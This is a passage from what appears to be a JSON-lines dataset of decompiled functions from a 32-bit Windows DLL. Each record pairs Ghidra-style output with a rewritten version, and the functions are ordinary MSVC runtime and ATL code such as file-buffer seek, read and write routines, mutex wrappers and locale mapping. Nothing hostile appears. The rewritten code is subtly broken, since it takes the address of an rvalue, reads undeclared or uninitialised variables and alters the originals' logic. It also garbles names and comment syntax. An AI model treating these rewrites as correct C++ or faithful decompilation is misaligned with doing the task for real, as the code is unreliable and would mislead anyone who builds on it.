(((**(basic_filebuf<char,struct_std::char_traits<char>_> ***)(this + 0x1c) == this + 0x3c) &&\n(param_4 == 1)) && (*(int *)(this + 0x38) == 0)) {\nbVar2 = param_3_00 != 0;\nparam_3_00 = param_3_00 - 1;\nparam_3 = (param_3 - 1) + (uint)bVar2;\n}\nif (((*(int *)(this + 0x4c) == 0) || (bVar2 = _Endwrite(this), !bVar2)) ||\n((((param_3_00 | param_3) != 0 || (param_4 != 1)) &&\n(iVar1 = __fseeki64(*(FILE **)(this + 0x4c), CONCAT44(param_4, param_3), 0), iVar1 != 0)\n))) || (iVar1 = _fgetpos(*(FILE **)(this + 0x4c), (fpos_t *)&this), iVar1 != 0)) {\n*param_1 = 0xffffffff;\nparam_1[1] = 0xffffffff;\nparam_1[2] = 0;\nparam_1[3] = 0;\nparam_1[4] = 0;\nparam_1[5] = 0;\n}\nelse {\n_Reset_back(this);\nfpos<struct__Mbstatet>::fpos<struct__Mbstatet>\n((fpos<struct__Mbstatet> *)param_1, *(undefined4 *)(this + 0x40),\n*(undefined4 *)(this + 0x44), this, this);\n}\nreturn param_1;\n}"}
{"Function Name": "std::basic_filebuf<char,struct_std::char_traits<char>_>::seekpos", "Address": "10016145", "Source Code": "\\*\nundefined4 * __thiscall\nstd::basic_filebuf<char,struct_std::char_traits<char>_>::seekpos\n(basic_filebuf<char,struct_std::char_traits<char>_> *this, undefined4 *param_1, uint param_2\n,int param_3, uint param_4, int param_5, undefined4 param_6, undefined4 param_7)\n{\n    \n    if ((*(int *)(this + 0x4c) != 0) && _Endwrite(this) &&\n        \n        (_fsetpos(*(FILE **)(this + 0x4c), (fpos_t *)&(param_2 + param_4)) == 0)) {\n        \n        \n        *(undefined4 *)(this + 0x40) = param_6;\n        *(undefined4 *)(this + 0x44) = param_7;\n        \n        \n        _Reset_back(this);\n        \n        \n        fpos<struct__Mbstatet>::fpos<struct__Mbstatet>\n        ((fpos<struct__Mbstatet> *)param_1, *(undefined4 *)(this + 0x40),\n        *(undefined4 *)(this + 0x44), param_2 + param_4, param_3 + param_5 + (uint)CARRY4(param_2, param_4));\n        \n        \n        return param_1;\n    }\n    \n    \n    for (int i = 0; i < 6; i++) {\n        param_1[i] = 0xffffffff;\n    }\n    \n    \n    return param_1;\n}\n*\\ \n \nundefined4 * __thiscall\nstd::basic_filebuf<char,struct_std::char_traits<char>_>::seekpos\n(basic_filebuf<char,struct_std::char_traits<char>_> *this, undefined4 *param_1, uint param_2\n,int param_3, uint param_4, int param_5, undefined4 param_6, undefined4 param_7)\n{\n    if ((*(int *)(this + 0x4c) != 0) && _Endwrite(this) &&\n        (_fsetpos(*(FILE **)(this + 0x4c), (fpos_t *)&(param_2 + param_4)) == 0)) {\n        *(undefined4 *)(this + 0x40) = param_6;\n        *(undefined4 *)(this + 0x44) = param_7;\n        _Reset_back(this);\n        fpos<struct__Mbstatet>::fpos<struct__Mbstatet>\n        ((fpos<struct__Mbstatet> *)param_1, *(undefined4 *)(this + 0x40),\n        *(undefined4 *)(this + 0x44), param_2 + param_4, param_3 + param_5 + (uint)CARRY4(param_2, param_4));\n        return param_1;\n    }\n    for (int i = 0; i < 6; i++) {\n        param_1[i] = 0xffffffff;\n    }\n    return param_1;\n}"}
{"Function Name": "std::basic_filebuf<char,struct_std::char_traits<char>_>::setbuf", "Address": "100161e9", "Source Code": "\\*\nbasic_streambuf<char,struct_std::char_traits<char>_> * __thiscall\nstd::basic_filebuf<char,struct_std::char_traits<char>_>::setbuf\n(basic_filebuf<char,struct_std::char_traits<char>_> *this,char *param_1,__int64 param_2)\n{\n    \n    if (*(int *)(this + 0x4c) != 0) {\n        \n        int iVar1 = (param_1 == (char *)0x0 && param_2 == 0) ? 4 : 0;\n        \n        \n        iVar1 = _setvbuf(*(FILE **)(this + 0x4c), param_1, iVar1, 0);\n        \n        \n        if (iVar1 == 0) {\n            _Init(this, *(_iobuf **)(this + 0x4c), 1);\n            \n            return (basic_streambuf<char,struct_std::char_traits<char>_> *)this;\n        }\n    }\n    \n    return (basic_streambuf<char,struct_std::char_traits<char>_> *)0x0;\n}\n*\\ \n \nbasic_streambuf<char,struct_std::char_traits<char>_> * __thiscall\nstd::basic_filebuf<char,struct_std::char_traits<char>_>::setbuf\n(basic_filebuf<char,struct_std::char_traits<char>_> *this,char *param_1,__int64 param_2)\n{\n    if (*(int *)(this + 0x4c) != 0) {\n        int iVar1 = (param_1 == (char *)0x0 && param_2 == 0) ? 4 : 0;\n        iVar1 = _setvbuf(*(FILE **)(this + 0x4c), param_1, iVar1, 0);\n        if (iVar1 == 0) {\n            _Init(this, *(_iobuf **)(this + 0x4c), 1);\n            return (basic_streambuf<char,struct_std::char_traits<char>_> *)this;\n        }\n    }\n    return (basic_streambuf<char,struct_std::char_traits<char>_> *)0x0;\n}"}
{"Function Name": "FUN_10016237", "Address": "10016237", "Source Code": "undefined4 __fastcall FUN_10016237(undefined4 input_parameter)\n{\n    \n    return input_parameter;\n}"}
{"Function Name": "std::basic_filebuf<char,struct_std::char_traits<char>_>::sync", "Address": "10016241", "Source Code": "int __thiscall\nstd::basic_filebuf<char,struct_std::char_traits<char>_>::sync\n(basic_filebuf<char,struct_std::char_traits<char>_> *this)\n{\n    int iVar2; \n    \n    if (*(int *)(this + 0x4c) != 0) {\n        \n        iVar2 = (*(code **)(*(int *)this + 0xc))();\n        \n        \n        if ((iVar2 != -1) && (iVar2 = FUN_1002744b(*(int *)(this + 0x4c)), iVar2 < 0)) {\n            return -1; \n        }\n    }\n    return 0; \n}"}
{"Function Name": "std::basic_filebuf<char,struct_std::char_traits<char>_>::uflow", "Address": "1001627a", "Source Code": "int __thiscall\nstd::basic_filebuf<char,struct_std::char_traits<char>_>::uflow\n(basic_filebuf<char,struct_std::char_traits<char>_> *this)\n{\n    uint uVar1; \n    code *pcVar2; \n    int iVar3; \n    undefined4 *******pppppppuVar4; \n    undefined4 *******pppppppuVar5; \n    undefined *local_3c; \n    int local_34; \n    char local_2e; \n    undefined local_2d; \n    undefined4 *******local_2c [4]; \n    int local_1c; \n    uint local_18; \n    local_18 = 0xf; \n    local_2c[0] = (undefined4 *******)((uint)local_2c[0] & 0xffffff00); \n    uVar1 = **(uint **)(this + 0x1c); \n    \n    if (uVar1 != 0) { \n        iVar3 = **(int **)(this + 0x2c); \n        if (uVar1 < iVar3 + uVar1) { \n            **(int **)(this + 0x2c) = iVar3 - 1; \n            **(int **)(this + 0x1c) = **(int **)(this + 0x1c) + 1; \n            goto LAB_100163f2; \n        }\n    }\n    \n    if (*(int *)(this + 0x4c) != 0) { \n        _Reset_back(this); \n        \n        if (*(int *)(this + 0x38) != 0) { \n            local_1c = 0; \n            local_8 = 0; \n            iVar3 = _fgetc(*(FILE **)(this + 0x4c)); \n            \n            while (true) { \n                if (iVar3 == -1) goto LAB_100163e8; \n                basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::push_back\n                ((basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_ *)local_2c, (char)iVar3); \n                \n                pppppppuVar5 = local_2c; \n                if (0xf < local_18) { \n                    pppppppuVar5 = local_2c[0]; \n                }\n                \n                pppppppuVar4 = local_2c; \n                if (0xf < local_18) { \n                    pppppppuVar4 = local_2c[0]; \n                }\n                \n                pcVar2 = *(code **)(*(int **)(this + 0x38) + 0x18); \n                (*(code *)PTR__guard_check_icall_1003a2f8)(this + 0x40, pppppppuVar4, local_1c + (int)pppppppuVar5, &local_34, &local_2d, local_2c, &local_3c); \n                iVar3 = (*pcVar2)(); \n                \n                if ((iVar3 < 0) || (1 < iVar3)) goto LAB_100163e8; \n                if (local_3c != &local_2d) break; \n                \n                if (0xf < local_18) { \n                    pppppppuVar5 = local_2c[0]; \n                }\n                \n                basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::erase\n                ((basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_ *)local_2c, 0, local_34 - (int)pppppppuVar5); \n                iVar3 = _fgetc(*(FILE **)(this + 0x4c)); \n            }\n            \n            if (0xf < local_18) { \n                pppppppuVar5 = local_2c[0]; \n            }\n            \n            iVar3 = (local_1c - local_34) + (int)pppppppuVar5; \n            while (0 < iVar3) { \n                iVar3 = iVar3 - 1; \n                _ungetc((int)*(char *)(iVar3 + local_34), *(FILE **)(this + 0x4c)); \n            }\n        LAB_100163e8: \n            FUN_10002590(local_2c); \n            goto LAB_100163f2; \n        }\n        \n        _Fgetc<char>(&local_2e, *(_iobuf **)(this + 0x4c)); \n    }\nLAB_100163f2: \n    return FUN_1003700c(); \n}"}
{"Function Name": "std::basic_streambuf<char,struct_std::char_traits<char>_>::uflow", "Address": "100163f8", "Source Code": "int __thiscall\nstd::basic_streambuf<char,struct_std::char_traits<char>_>::uflow\n(basic_streambuf<char,struct_std::char_traits<char>_> *this)\n{\n    \n    code *pcVar1 = *(code **)(*(int *)this + 0x18);\n    \n    \n    (*(code *)PTR__guard_check_icall_1003a2f8)();\n    \n    \n    int iVar3 = (*pcVar1)();\n    \n    \n    if (iVar3 != -1) {\n        \n        **(int **)(this + 0x2c) -= 1;\n        \n        \n        byte *pbVar2 = **(byte ***)(this + 0x1c);\n        \n        \n        **(byte ***)(this + 0x1c) = pbVar2 + 1;\n        \n        \n        return (uint)*pbVar2;\n    }\n    \n    \n    return 0xffffffff;\n}"}
{"Function Name": "std::basic_filebuf<char,struct_std::char_traits<char>_>::underflow", "Address": "1001642b", "Source Code": "int __thiscall\nstd::basic_filebuf<char,struct_std::char_traits<char>_>::underflow\n(basic_filebuf<char,struct_std::char_traits<char>_> *this)\n{\n    \n    byte *pbVar1 = **(byte ***)(this + 0x1c);\n    \n    \n    if (pbVar1 != (byte *)0x0 && pbVar1 < pbVar1 + **(int **)(this + 0x2c)) {\n        \n        return (uint)*pbVar1;\n    }\n    \n    \n    code *pcVar2 = *(code **)(*(int *)this + 0x1c);\n    \n    \n    (*(code *)PTR__guard_check_icall_1003a2f8)();\n    \n    \n    int iVar3 = (*pcVar2)();\n    \n    \n    if (iVar3 != -1) {\n        \n        pcVar2 = *(code **)(*(int *)this + 0x10);\n        \n        \n        (*(code *)PTR__guard_check_icall_1003a2f8)(iVar3);\n        \n        \n        (*pcVar2)();\n        \n        \n        return iVar3;\n    }\n    \n    \n    return -1;\n}"}
{"Function Name": "std::basic_filebuf<char,struct_std::char_traits<char>_>::xsgetn", "Address": "1001647f", "Source Code": "__int64 __thiscall\nstd::basic_filebuf<char,struct_std::char_traits<char>_>::xsgetn\n(basic_filebuf<char,struct_std::char_traits<char>_> *this,char *param_1,__int64 param_2)\n{\n    size_t sVar1; \n    int iVar2; \n    uint _Count; \n    undefined4 unaff_EDI; \n    bool bVar3; \n    __int64 _Var4; \n    uint in_stack_00000008; \n    char *local_8; \n    \n    if (*(int *)(this + 0x38) == 0) {\n        \n        local_8 = (undefined8 *)**(undefined4 **)(this + 0x1c) ? (char *)**(uint **)(this + 0x2c) : (char *)0x0;\n        \n        \n        if ((-1 < (int)param_2) && ((0 < (int)param_2 || (in_stack_00000008 != 0)))) {\n            \n            if ((local_8 == (char *)0x0) || ((int)param_2 <= (int)local_8)) {\n                local_8 = param_1; \n            } else {\n                \n                if ((int)param_2 < (int)local_8 || (in_stack_00000008 < local_8)) {\n                    local_8 = (char *)in_stack_00000008; \n                }\n                \n                FUN_10018670((undefined8 *)param_1,(undefined8 *)**(undefined4 **)(this + 0x1c), (uint)local_8);\n                \n                **(int **)(this + 0x2c) -= (int)local_8; \n                **(int **)(this + 0x1c) += (int)local_8; \n                \n                iVar2 = (int)param_2 - (int)local_8 - (uint)(in_stack_00000008 < local_8);\n                _Count = in_stack_00000008 - (int)local_8; \n                local_8 = param_1 + (int)local_8; \n            }\n            \n            if ((-1 < iVar2) && (((0 < iVar2 || (_Count != 0)) && (*(int *)(this + 0x4c) != 0)))) {\n                _Reset_back(this); \n                \n                sVar1 = _fread(local_8, 1, _Count, *(FILE **)(this + 0x4c));\n                bVar3 = _Count < sVar1; \n                _Count -= sVar1; \n                iVar2 -= (uint)bVar3; \n            }\n        }\n        \n        _Var4 = CONCAT44(((int)param_2 - iVar2) - (uint)(in_stack_00000008 < _Count), in_stack_00000008 - _Count);\n    } else {\n        \n        _Var4 = basic_streambuf<char,struct_std::char_traits<char>_>::xsgetn((basic_streambuf<char,struct_std::char_traits<char>_> *)this, param_1, CONCAT44(unaff_EDI, (int)param_2));\n    }\n    return _Var4; \n}"}
{"Function Name": "std::basic_streambuf<char,struct_std::char_traits<char>_>::xsgetn", "Address": "10016566", "Source Code": "__int64 __thiscall\nstd::basic_streambuf<char,struct_std::char_traits<char>_>::xsgetn\n(basic_streambuf<char,struct_std::char_traits<char>_> *this,char *param_1,__int64 param_2)\n{\n    int iVar2; \n    int iVar3 = (int)param_2; \n    uint uVar4, uVar5 = in_stack_00000008; \n    \n    if ((-1 < (int)param_2) && ((0 < (int)param_2 || (in_stack_00000008 != 0)))) {\n        do {\n            \n            if ((undefined8 *)**(undefined4 **)(this + 0x1c) == (undefined8 *)0x0) {\n                uVar4 = 0; \n            } else {\n                uVar4 = **(uint **)(this + 0x2c); \n            }\n            int local_c = (int)uVar4 >> 0x1f; \n            \n            if ((local_c < 0) || ((-1 < (int)uVar4 || local_c < 0 && (uVar4 == 0)))) {\n                (*(code *)PTR__guard_check_icall_1003a2f8)(); \n                iVar2 = (*(code **)(*(int *)this + 0x1c))(); \n                if (iVar2 == -1) break; \n                bool bVar6 = uVar5 != 0; \n                uVar5 = uVar5 - 1; \n                iVar3 = iVar3 + -1 + (uint)bVar6; \n                uVar4 = 1; \n                *param_1 = (char)iVar2; \n            } else {\n                \n                if ((iVar3 <= local_c) && ((iVar3 < local_c || (uVar5 < uVar4)))) {\n                    uVar4 = uVar5; \n                    local_c = iVar3; \n                }\n                \n                FUN_10018670((undefined8 *)param_1, (undefined8 *)**(undefined4 **)(this + 0x1c), uVar4);\n                bool bVar6 = uVar5 < uVar4; \n                uVar5 = uVar5 - uVar4; \n                iVar3 = (iVar3 - local_c) - (uint)bVar6; \n                **(int **)(this + 0x2c) -= uVar4; \n                **(int **)(this + 0x1c) += uVar4; \n            }\n            param_1 += uVar4; \n            \n            if ((iVar3 < 1) && ((iVar3 < 0 || (uVar5 == 0)))) break; \n        } while (true); \n    }\n    \n    return CONCAT44(((int)param_2 - iVar3) - (uint)(in_stack_00000008 < uVar5), in_stack_00000008 - uVar5);\n}"}
{"Function Name": "std::basic_filebuf<char,struct_std::char_traits<char>_>::xsputn", "Address": "10016642", "Source Code": "__int64 __thiscall\nstd::basic_filebuf<char,struct_std::char_traits<char>_>::xsputn\n(basic_filebuf<char,struct_std::char_traits<char>_> *this,char *param_1,__int64 param_2)\n{\n    uint _Count; \n    int iVar2; \n    __int64 _Var4; \n    uint in_stack_00000008; \n    \n    if (*(int *)(this + 0x38) == 0) {\n        \n        uint local_8 = (*(undefined8 **)(this + 0x20) == (undefined8 *)0x0) ? 0 : **(uint **)(this + 0x30);\n        int local_c = (int)local_8; \n        iVar2 = (int)param_2; \n        \n        if ((-1 < (int)param_2) && ((0 < (int)param_2 || (in_stack_00000008 != 0)))) {\n            \n            if ((-1 < local_c) && (((int)local_8 < 0 && -1 < local_c || (local_8 != 0)))) {\n                if (((int)param_2 <= local_c) && (((int)param_2 < local_c || (in_stack_00000008 < local_8)))) {\n                    local_8 = in_stack_00000008; \n                    local_c = (int)param_2; \n                }\n                \n                FUN_10018670((undefined8 *)**(undefined4 **)(this + 0x20),(undefined8 *)param_1,local_8);\n                param_1 = param_1 + local_8; \n                **(int **)(this + 0x30) = **(int **)(this + 0x30) - local_8; \n                **(int **)(this + 0x20) = **(int **)(this + 0x20) + local_8; \n                _Count = in_stack_00000008 - local_8; \n                iVar2 = ((int)param_2 - local_c) - (uint)(in_stack_00000008 < local_8); \n            }\n            \n            if ((-1 < iVar2) && (((0 < iVar2 || (_Count != 0)) && (*(int *)(this + 0x4c) != 0)))) {\n                \n                size_t sVar1 = _fwrite(param_1,1,_Count,*(FILE **)(this + 0x4c));\n                _Count -= sVar1; \n                iVar2 -= (uint)(_Count < sVar1); \n            }\n        }\n        \n        _Var4 = CONCAT44(((int)param_2 - iVar2) - (uint)(in_stack_00000008 < _Count), in_stack_00000008 - _Count);\n    }\n    else {\n        \n        _Var4 = basic_streambuf<char,struct_std::char_traits<char>_>::xsputn\n        ((basic_streambuf<char,struct_std::char_traits<char>_> *)this,param_1,\n        CONCAT44(unaff_EBX,(int)param_2));\n    }\n    return _Var4; \n}"}
{"Function Name": "std::basic_streambuf<char,struct_std::char_traits<char>_>::xsputn", "Address": "10016716", "Source Code": "__int64 __thiscall\nstd::basic_streambuf<char,struct_std::char_traits<char>_>::xsputn\n(basic_streambuf<char,struct_std::char_traits<char>_> *this,char *param_1,__int64 param_2)\n{\n    code *pcVar1; \n    int iVar2; \n    uint uVar4; \n    uint uVar5; \n    int iVar3 = (int)param_2; \n    uVar5 = in_stack_00000008; \n    \n    if ((-1 < (int)param_2) && ((0 < (int)param_2 || (in_stack_00000008 != 0)))) {\n        do {\n            \n            uVar4 = (**(undefined4 **)(this + 0x20) == (undefined8 *)0x0) ? 0 : **(uint **)(this + 0x30);\n            int local_c = (int)uVar4; \n            \n            if ((local_c < 0) || ((-1 < (int)uVar4 || (local_c < 0 && (uVar4 == 0))))) {\n                pcVar1 = *(code **)(*(int *)this + 0xc); \n                (*(code *)PTR__guard_check_icall_1003a2f8)(*param_1); \n                iVar2 = (*pcVar1)(); \n                if (iVar2 == -1) break; \n                bool bVar6 = uVar5 != 0; \n                uVar5--; \n                iVar3 += -1 + (uint)bVar6; \n                uVar4 = 1; \n            } else {\n                \n                if ((iVar3 <= local_c) && ((iVar3 < local_c || (uVar5 < uVar4)))) {\n                    uVar4 = uVar5; \n                    local_c = iVar3; \n                }\n                \n                FUN_10018670((undefined8 *)**(undefined4 **)(this + 0x20),(undefined8 *)param_1,uVar4);\n                bool bVar6 = uVar5 < uVar4; \n                uVar5 -= uVar4; \n                iVar3 = (iVar3 - local_c) - (uint)bVar6; \n                **(int **)(this + 0x30) -= uVar4; \n                **(int **)(this + 0x20) += uVar4; \n            }\n            param_1 += uVar4; \n            \n            if ((iVar3 < 1) && ((iVar3 < 0 || (uVar5 == 0)))) break; \n        } while (true); \n    }\n    \n    return CONCAT44(((int)param_2 - iVar3) - (uint)(in_stack_00000008 < uVar5), in_stack_00000008 - uVar5);\n}"}
{"Function Name": "std::_Execute_once", "Address": "100167f3", "Source Code": "int __cdecl\nstd::_Execute_once(once_flag *param_1, _func_int_void_ptr_void_ptr_void_ptr_ptr *param_2, void *param_3)\n{\n    \n    \n    \n    \n    return ___crtInitOnceExecuteOnce((int *)param_1, param_2, param_3, 0);\n}"}
{"Function Name": "FUN_1001680b", "Address": "1001680b", "Source Code": "void __cdecl FUN_1001680b(LPCRITICAL_SECTION critical_section)\n{\n    \n    DeleteCriticalSection(critical_section);\n}"}
{"Function Name": "__Mtxinit", "Address": "10016819", "Source Code": "void __cdecl __Mtxinit(_Rmtx *mutex)\n{\n    \n    ___crtInitializeCriticalSectionEx(mutex, 4000, 0);\n}"}
{"Function Name": "__Mtxlock", "Address": "10016830", "Source Code": "void __cdecl __Mtxlock(_Rmtx *mutex)\n{\n    \n    EnterCriticalSection(mutex);\n}"}
{"Function Name": "FUN_1001683e", "Address": "1001683e", "Source Code": "void __cdecl FUN_1001683e(LPCRITICAL_SECTION critical_section)\n{\n    \n    LeaveCriticalSection(critical_section);\n}"}
{"Function Name": "_Init_atexit::~_Init_atexit", "Address": "1001684c", "Source Code": "void __thiscall _Init_atexit::~_Init_atexit(_Init_atexit *this)\n{\n    uint modifiedGlobalValue; \n    code *functionPointer; \n    modifiedGlobalValue = globalVariable ^ (uint)&stack0xfffffffc; \n    void *currentExceptionList = exceptionListPointer; \n    exceptionListPointer = &currentExceptionList; \n    while (entryIndex < 10) { \n        functionPointer = (code *)DecodePointer(*(PVOID *)(entryIndex * 4 + 0x1004fb50)); \n        if (functionPointer != (code *)0x0) { \n            (*(code *)guardCheckFunction)(modifiedGlobalValue); \n            (*functionPointer)(); \n        }\n        entryIndex++; \n    }\n    exceptionListPointer = currentExceptionList; \n    return; \n}"}
{"Function Name": "___crtLCMapStringA", "Address": "100168dd", "Source Code": "int __cdecl\n___crtLCMapStringA(_locale_t _Plocinfo, LPCWSTR _LocaleName, DWORD _DwMapFlag, LPCSTR _LpSrcStr,\nint _CchSrc, LPSTR _LpDestStr, int _CchDest, int _Code_page, BOOL _BError)\n{\n    uint uVar1; \n    LPCSTR pCVar2; \n    int iVar3; \n    uint uVar4; \n    int iVar5; \n    LPCSTR cbMultiByte = _LpSrcStr; \n    uVar1 = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    if (0 < (int)_LpSrcStr) { \n        pCVar2 = (LPCSTR)___strncnt((char *)_DwMapFlag, (int)_LpSrcStr); \n        cbMultiByte = pCVar2 + 1; \n        if ((int)_LpSrcStr <= (int)pCVar2) { \n            cbMultiByte = pCVar2; \n        }\n    }\n    iVar3 = MultiByteToWideChar(_CchDest, (uint)(_Code_page != 0) * 8 + 1, (LPCSTR)_DwMapFlag,\n                                (int)cbMultiByte, (LPWSTR)0x0, 0); \n    if (iVar3 == 0) goto LAB_10016aa0; \n    uVar4 = iVar3 * 2 + 8; \n    uVar4 = -(uint)((uint)(iVar3 * 2) < uVar4) & uVar4; \n    undefined4 *local_c = (uVar4 == 0) ? (undefined4 *)0x0 : (uVar4 < 0x401) ? (undefined4 *)&stack0xffffffe4 : (undefined4 *)FUN_10025334(uVar4); \n    if (local_c != (undefined4 *)0x0) { \n        if (uVar4 >= 0x401) { \n            *local_c = 0xdddd; \n        }\n        if ((iVar5 = MultiByteToWideChar(_CchDest, 1, (LPCSTR)_DwMapFlag, (int)cbMultiByte, (LPWSTR)local_c, iVar3), iVar5 != 0) && \n            (iVar5 = ___crtLCMapStringEx((LPCWSTR)_Plocinfo, (DWORD)_LocaleName, (LPCWSTR)local_c, iVar3, (LPWSTR)0x0, 0), iVar5 != 0)) { \n            if (((uint)_LocaleName & 0x400) == 0) { \n                uVar4 = iVar5 * 2 + 8; \n                uVar4 = -(uint)((uint)(iVar5 * 2) < uVar4) & uVar4; \n                if (uVar4 == 0) { \n                    goto LAB_10016a40; \n                }\n                if (uVar4 < 0x401) { \n                    undefined4 *puVar7 = (undefined4 *)&stack0xffffffe4; \n                    if (&stack0x00000000 != (undefined *)0x1c) { \n                        puVar7 += 2; \n                    }\n                    goto LAB_10016a40; \n                }\n                undefined4 *puVar7 = (undefined4 *)FUN_10025334(uVar4); \n                if (puVar7 != (undefined4 *)0x0) { \n                    *puVar7 = 0xdddd; \n                }\n            }\n            LAB_10016a40: \n            if ((local_c != (undefined4 *)0x0) && \n                (iVar3 = ___crtLCMapStringEx((LPCWSTR)_Plocinfo, (DWORD)_LocaleName, (LPCWSTR)local_c, iVar3, (LPWSTR)puVar7, iVar5), iVar3 != 0)) { \n                if (_LpDestStr == (LPSTR)0x0) { \n                    _CchSrc = 0; \n                }\n                iVar3 = WideCharToMultiByte(_CchDest, 0, (LPCWSTR)puVar7, iVar5, (LPSTR)_CchSrc, (int)_LpDestStr, (LPCSTR)0x0, (LPBOOL)0x0); \n                if (iVar3 != 0) { \n                    __freea_crt((int)puVar7); \n                    goto LAB_10016a95; \n                }\n            }\n        } else { \n            undefined4 *puVar7 = (undefined4 *)&stack0xffffffe4; \n            if (&stack0x00000000 != (undefined *)0x1c) { \n                puVar7 += 2; \n            }\n            goto LAB_10016a40; \n        }\n    } else if ((_LpDestStr != (LPSTR)0x0) && (iVar5 <= (int)_LpDestStr)) { \n        ___crtLCMapStringEx((LPCWSTR)_Plocinfo, (DWORD)_LocaleName, (LPCWSTR)local_c, iVar3, (LPWSTR)_CchSrc, (int)_LpDestStr); \n    }\n    LAB_10016a95: \n    __freea_crt((int)local_c); \n    LAB_10016aa0: \n    iVar3 = ___security_check_cookie_4(uVar1 ^ (uint)&stack0xfffffffc); \n    return iVar3; \n}"}
{"Function Name": "std::ios_base::_Addstd", "Address": "10016ad0", "Source Code": "void __cdecl std::ios_base::_Addstd(ios_base *iosBasePtr)\n{\n    uint counter = 1; \n    _Lockit::_Lockit((_Lockit *)&lockObject, 2); \n    *(undefined4 *)(iosBasePtr + 8) = 1; \n    do {\n        ios_base *currentIosBase = *(ios_base **)(counter * 4 + 0x1004fb7c); \n        if ((currentIosBase == (ios_base *)0x0) || (currentIosBase == iosBasePtr)) break; \n        counter++; \n        *(uint *)(iosBasePtr + 8) = counter; \n    } while (counter < 8); \n    (&globalDataArray)[counter]++; \n    *(ios_base **)(counter * 4 + 0x1004fb7c) = iosBasePtr; \n    releaseLock(&lockObject); \n}"}
{"Function Name": "std::ios_base::_Callfns", "Address": "10016b1c", "Source Code": "void __thiscall std::ios_base::_Callfns(ios_base *iosBase, event eventParam)\n{\n    \n    undefined4 *callbackPtr = *(undefined4 **)(iosBase + 0x2c);\n    code *functionPtr; \n    \n    while (callbackPtr != (undefined4 *)0x0) {\n        \n        functionPtr = (code *)callbackPtr[2];\n        \n        (*(code *)PTR__guard_check_icall_1003a2f8)(eventParam, iosBase, callbackPtr[1]);\n        \n        (*functionPtr)();\n        \n        callbackPtr = (undefined4 *)*callbackPtr;\n    }\n}"}
{"Function Name": "std::ios_base::_Ios_base_dtor", "Address": "10016b4f", "Source Code": "void __cdecl std::ios_base::_Ios_base_dtor(ios_base *iosBasePtr)\n{\n    \n    int referenceCount = *(int *)(iosBasePtr + 8);\n    \n    \n    if (referenceCount == 0 || --(&DAT_1004fba4)[referenceCount] < 1)\n    {\n        \n        _Tidy(iosBasePtr);\n        \n        \n        void *resourcePtr = *(void **)(iosBasePtr + 0x30);\n        \n        \n        if (resourcePtr != (void *)0x0) {\n            \n            FUN_100019d0((int)resourcePtr);\n            \n            FUN_10013ceb(resourcePtr);\n        }\n    }\n}"}
{"Function Name": "std::ios_base::_Tidy", "Address": "10016b8f", "Source Code": "void __thiscall std::ios_base::_Tidy(ios_base *iosBaseInstance)\n{\n    \n    undefined4 *cleanupListPointer = *(undefined4 **)(iosBaseInstance + 0x28);\n    \n    \n    _Callfns(iosBaseInstance, 0);\n    \n    \n    while (cleanupListPointer != (undefined4 *)0x0) {\n        \n        undefined4 *nextCleanupElement = (undefined4 *)*cleanupListPointer;\n        \n        \n        FUN_10013ceb(cleanupListPointer);\n        \n        \n        cleanupListPointer = nextCleanupElement;\n    }\n    \n    \n    *(undefined4 *)(iosBaseInstance + 0x28) = 0;\n    \n    cleanupListPointer = *(undefined4 **)(iosBaseInstance + 0x2c);\n    \n    \n    while (cleanupListPointer != (undefined4 *)0x0) {\n        \n        undefined4 *nextCleanupElement = (undefined4 *)*cleanupListPointer;\n        \n        \n        FUN_10013ceb(cleanupListPointer);\n        \n        \n        cleanupListPointer = nextCleanupElement;\n    }\n    \n    \n    *(undefined4 *)(iosBaseInstance + 0x2c) = 0;\n}"}
{"Function Name": "___crtDownlevelLocaleNameToLCID", "Address": "10017096", "Source Code": "undefined4 __cdecl ___crtDownlevelLocaleNameToLCID(int localeName)\n{\n    \n    uint tableIndex = _GetTableIndexFromLocaleName(localeName);\n    \n    \n    if (localeName != 0 && tableIndex < 0xe4) {\n        \n        return *(undefined4 *)(&dataTable + tableIndex * 8);\n    }\n    \n    \n    return 0;\n}"}
{"Function Name": "ATL::CAtlBaseModule::CAtlBaseModule", "Address": "1001717f", "Source Code": "\\*\nModuleInstance * __thiscall ATL::ModuleInstance::ModuleInstance(ModuleInstance *this)\n{\n    \n    _ATL_BASE_MODULE70::BaseModule((_ATL_BASE_MODULE70 *)this);\n    \n    \n    *(undefined4 *)this = 0x38;\n    \n    \n    *(undefined4 *)(this + 8) = 0x10000000;\n    \n    \n    *(undefined4 *)(this + 4) = 0x10000000;\n    \n    \n    *(undefined4 *)(this + 0xc) = 0xe00;\n    \n    \n    *(undefined **)(this + 0x10) = &DataStructurePointer;\n    \n    \n    if (InitializeCriticalSection((CriticalSectionPointer)(this + 0x14)) < 0) {\n        \n        if (IsDebuggerPresent()) {\n            OutputDebugStringW(L\"ERROR : Unable to initialize critical section in CAtlBaseModule\\n\");\n        }\n        \n        InitializationErrorFlag = 1;\n    }\n    \n    \n    return this;\n}\n*\\ \n \nModuleInstance * __thiscall ATL::ModuleInstance::ModuleInstance(ModuleInstance *this)\n{\n    _ATL_BASE_MODULE70::BaseModule((_ATL_BASE_MODULE70 *)this);\n    *(undefined4 *)this = 0x38;\n    *(undefined4 *)(this + 8) = 0x10000000;\n    *(undefined4 *)(this + 4) = 0x10000000;\n    *(undefined4 *)(this + 0xc) = 0xe00;\n    *(undefined **)(this + 0x10) = &DataStructurePointer;\n    \n    if (InitializeCriticalSection((CriticalSectionPointer)(this + 0x14)) < 0) {\n        if (IsDebuggerPresent()) {\n            OutputDebugStringW(L\"ERROR : Unable to initialize critical section in CAtlBaseModule\\n\");\n        }\n        InitializationErrorFlag = 1;\n    }\n    \n    return this;\n}"}
